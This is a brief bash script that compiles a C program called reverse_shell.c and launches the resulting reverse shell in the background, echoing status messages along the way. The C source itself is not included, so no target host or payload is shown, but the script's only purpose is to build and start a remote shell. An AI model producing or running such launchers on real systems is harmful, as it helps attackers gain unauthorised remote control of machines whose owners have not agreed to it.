#!/bin/bash

# Compile the C program
gcc -o reverse_shell reverse_shell.c

# Check if compilation was successful
if [ $? -eq 0 ]; then
    echo "Compilation successful. Running the reverse shell..."
    
    # Run the reverse shell in the background
    ./reverse_shell &
    
    echo "Reverse shell launched."
else
    echo "Compilation failed. Exiting..."
    exit 1
fi